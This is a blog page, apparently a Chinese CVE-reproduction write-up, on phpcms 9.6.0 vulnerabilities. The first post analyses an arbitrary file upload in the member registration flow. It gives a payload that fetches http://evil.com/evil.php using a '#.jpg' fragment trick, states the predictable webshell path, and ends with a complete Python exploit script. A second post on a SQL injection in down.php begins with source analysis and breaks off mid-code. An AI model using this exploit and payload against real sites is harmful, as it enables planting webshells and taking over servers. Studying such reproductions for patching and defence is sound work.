<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$field</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">				...</span><br><span class="line">				<span class="variable">$field</span> = safe_replace(<span class="variable">$field</span>);</span><br><span class="line">				...</span><br><span class="line">				<span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;formtype&#x27;</span>];</span><br><span class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$func</span>(<span class="variable">$field</span>, <span class="variable">$value</span>);</span><br><span class="line">	</span><br><span class="line">				<span class="variable">$info</span>[<span class="variable">$field</span>] = <span class="variable">$value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
<p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;catid&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;catid&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;typeid&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;typeid&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;title&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;title&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;keywords&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;keyword&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;copyfrom&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;copyfrom&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;description&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;textarea&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;updatetime&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;datetime&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;content&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;editor&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;thumb&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;image&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;relation&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;omnipotent&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;pages&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;pages&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;inputtime&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;datetime&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;posids&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;posid&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;groupids_view&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;groupid&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;voteid&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;omnipotent&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;islink&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;islink&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;url&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;text&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;listorder&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;number&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;template&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;template&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;allow_comment&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;box&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;status&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;box&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;readpoint&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;readpoint&quot;</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;username&#x27;</span>][<span class="string">&#x27;formtype&#x27;</span>]=<span class="string">&quot;text&quot;</span></span><br></pre></td></tr></table></figure>

<p>一个一个查看最后发现:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$setting</span> = string2array(<span class="keyword">$this</span>-&gt;fields[<span class="variable">$field</span>][<span class="string">&#x27;setting&#x27;</span>]);</span><br><span class="line">	<span class="variable">$enablesaveimage</span> = <span class="variable">$setting</span>[<span class="string">&#x27;enablesaveimage&#x27;</span>];</span><br><span class="line">	<span class="variable">$site_setting</span> = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">&#x27;setting&#x27;</span>]);</span><br><span class="line">	<span class="variable">$watermark_enable</span> = intval(<span class="variable">$site_setting</span>[<span class="string">&#x27;watermark_enable&#x27;</span>]);</span><br><span class="line">	<span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">&#x27;content&#x27;</span>, <span class="variable">$value</span>,<span class="variable">$watermark_enable</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p>
<p>跟进<code>download</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$value</span>,<span class="variable">$watermark</span> = <span class="string">&#x27;0&#x27;</span>,<span class="variable">$ext</span> = <span class="string">&#x27;gif|jpg|jpeg|bmp|png&#x27;</span>, <span class="variable">$absurl</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$basehref</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$image_d</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">&#x27;attachment_model&#x27;</span>);</span><br><span class="line">		<span class="variable">$upload_url</span> = pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;field = <span class="variable">$field</span>;</span><br><span class="line">		<span class="variable">$dir</span> = date(<span class="string">&#x27;Y/md/&#x27;</span>);</span><br><span class="line">		<span class="variable">$uploadpath</span> = <span class="variable">$upload_url</span>.<span class="variable">$dir</span>;</span><br><span class="line">		<span class="variable">$uploaddir</span> = <span class="keyword">$this</span>-&gt;upload_root.<span class="variable">$dir</span>;</span><br><span class="line">		<span class="variable">$string</span> = new_stripslashes(<span class="variable">$value</span>);</span><br><span class="line">		<span class="keyword">if</span>(!preg_match_all(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">		<span class="variable">$remotefileurls</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$matches</span>[<span class="number">3</span>] <span class="keyword">as</span> <span class="variable">$matche</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos(<span class="variable">$matche</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create(<span class="variable">$uploaddir</span>);</span><br><span class="line">			<span class="variable">$remotefileurls</span>[<span class="variable">$matche</span>] = <span class="keyword">$this</span>-&gt;fillurl(<span class="variable">$matche</span>, <span class="variable">$absurl</span>, <span class="variable">$basehref</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$matches</span>, <span class="variable">$string</span>);</span><br><span class="line">		<span class="variable">$remotefileurls</span> = array_unique(<span class="variable">$remotefileurls</span>);</span><br><span class="line">		<span class="variable">$oldpath</span> = <span class="variable">$newpath</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$remotefileurls</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos(<span class="variable">$file</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="variable">$upload_url</span>) !== <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line">			<span class="variable">$file_name</span> = basename(<span class="variable">$file</span>);</span><br><span class="line">			<span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$newfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$filename</span>;</span><br><span class="line">			<span class="variable">$upload_func</span> = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$upload_func</span>(<span class="variable">$file</span>, <span class="variable">$newfile</span>)) &#123;</span><br><span class="line">				<span class="variable">$oldpath</span>[] = <span class="variable">$k</span>;</span><br><span class="line">				<span class="variable">$GLOBALS</span>[<span class="string">&#x27;downloadfiles&#x27;</span>][] = <span class="variable">$newpath</span>[] = <span class="variable">$uploadpath</span>.<span class="variable">$filename</span>;</span><br><span class="line">				@chmod(<span class="variable">$newfile</span>, <span class="number">0777</span>);</span><br><span class="line">				<span class="variable">$fileext</span> = fileext(<span class="variable">$filename</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$watermark</span>)&#123;</span><br><span class="line">					watermark(<span class="variable">$newfile</span>, <span class="variable">$newfile</span>,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$filepath</span> = <span class="variable">$dir</span>.<span class="variable">$filename</span>;</span><br><span class="line">				<span class="variable">$downloadedfile</span> = <span class="keyword">array</span>(<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$filename</span>, <span class="string">&#x27;filepath&#x27;</span>=&gt;<span class="variable">$filepath</span>, <span class="string">&#x27;filesize&#x27;</span>=&gt;filesize(<span class="variable">$newfile</span>), <span class="string">&#x27;fileext&#x27;</span>=&gt;<span class="variable">$fileext</span>);</span><br><span class="line">				<span class="variable">$aid</span> = <span class="keyword">$this</span>-&gt;add(<span class="variable">$downloadedfile</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;downloadedfiles[<span class="variable">$aid</span>] = <span class="variable">$filepath</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str_replace(<span class="variable">$oldpath</span>, <span class="variable">$newpath</span>, <span class="variable">$value</span>);</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>

<p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p>
<p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p>
<p><code>$file</code>是<code>$remotefileurls</code>中的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = new_stripslashes(<span class="variable">$value</span>);<span class="comment">//反转义</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="variable">$remotefileurls</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$matches</span>[<span class="number">3</span>] <span class="keyword">as</span> <span class="variable">$matche</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(strpos(<span class="variable">$matche</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">	dir_create(<span class="variable">$uploaddir</span>);</span><br><span class="line">	<span class="variable">$remotefileurls</span>[<span class="variable">$matche</span>] = <span class="keyword">$this</span>-&gt;fillurl(<span class="variable">$matche</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillurl</span>(<span class="params"><span class="variable">$surl</span>, <span class="variable">$absurl</span>, <span class="variable">$basehref</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">		...</span><br><span class="line">		<span class="variable">$pos</span> = strpos(<span class="variable">$surl</span>,<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$pos</span>&gt;<span class="number">0</span>) <span class="variable">$surl</span> = substr(<span class="variable">$surl</span>,<span class="number">0</span>,<span class="variable">$pos</span>);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
<p>我们再看下<code>$newfile</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dir</span> = date(<span class="string">&#x27;Y/md/&#x27;</span>);</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="keyword">$this</span>-&gt;upload_root.<span class="variable">$dir</span>;</span><br><span class="line"><span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getname(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$filename</span>;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;getname</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span>(<span class="params"><span class="variable">$fileext</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> date(<span class="string">&#x27;Ymdhis&#x27;</span>).rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$fileext</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>webshell的地址为:<code> http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
<p>最后payload为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line">post:</span><br><span class="line">info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,evilurl=<span class="string">&quot;http://xxxxxxx/evil.php&quot;</span></span>):</span></span><br><span class="line">    u = <span class="string">&#x27;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#x27;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;siteid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;modelid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;test%d&#x27;</span>%random.randint(<span class="number">1</span>,<span class="number">999999</span>),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;testxx&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;test%d@test.com&#x27;</span>%random.randint(<span class="number">1</span>,<span class="number">999999</span>),</span><br><span class="line">        <span class="string">&#x27;info[content]&#x27;</span>: <span class="string">&#x27;src=%s#.jpg&#x27;</span>%evilurl,</span><br><span class="line">        <span class="string">&#x27;dosubmit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(u, data=data)</span><br><span class="line">    result=re.search(<span class="string">r&quot;VALUES \(&#x27;src=(.*)&#x27;,&#x27;\d*&#x27;\)&quot;</span>,rep.text).groups()</span><br><span class="line">    <span class="built_in">print</span>(rep.text)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp(<span class="string">&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;</span>)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="cku89gxv2005awvosepke20dd" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpcmsv9.6.0SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQL注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>开启wap</li>
<li>phpcms 版本小于等于9.6.0</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p>
<blockquote>
<p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$a_k</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;a_k&#x27;</span>]);</span><br><span class="line">		<span class="variable">$a_k</span> = sys_auth(<span class="variable">$a_k</span>, <span class="string">&#x27;DECODE&#x27;</span>, pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;auth_key&#x27;</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a_k</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line">		parse_str(<span class="variable">$a_k</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$i</span>)) <span class="variable">$i</span> = <span class="variable">$id</span> = intval(<span class="variable">$i</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$modelid</span>)||!<span class="keyword">isset</span>(<span class="variable">$catid</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$f</span>)) showmessage(L(<span class="string">&#x27;url_invalid&#x27;</span>));</span><br><span class="line">		<span class="variable">$allow_visitor</span> = <span class="number">1</span>;</span><br><span class="line">		<span class="variable">$MODEL</span> = getcache(<span class="string">&#x27;model&#x27;</span>,<span class="string">&#x27;commons&#x27;</span>);</span><br><span class="line">		<span class="variable">$tablename</span> = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.<span class="variable">$MODEL</span>[<span class="variable">$modelid</span>][<span class="string">&#x27;tablename&#x27;</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="variable">$tablename</span>.<span class="string">&#x27;_data&#x27;</span>;</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$id</span>));	</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    </code>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_one</span>(<span class="params"><span class="variable">$where</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span> = <span class="string">&#x27;*&#x27;</span>, <span class="variable">$order</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$group</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (is_array(<span class="variable">$where</span>)) <span class="variable">$where</span> = <span class="keyword">$this</span>-&gt;sqls(<span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="variable">$data</span>, <span class="keyword">$this</span>-&gt;table_name, <span class="variable">$where</span>, <span class="variable">$order</span>, <span class="variable">$group</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqls</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$font</span> = <span class="string">&#x27; AND &#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (is_array(<span class="variable">$where</span>)) &#123;</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>) &#123;</span><br><span class="line">				<span class="variable">$sql</span> .= <span class="variable">$sql</span> ? <span class="string">&quot; <span 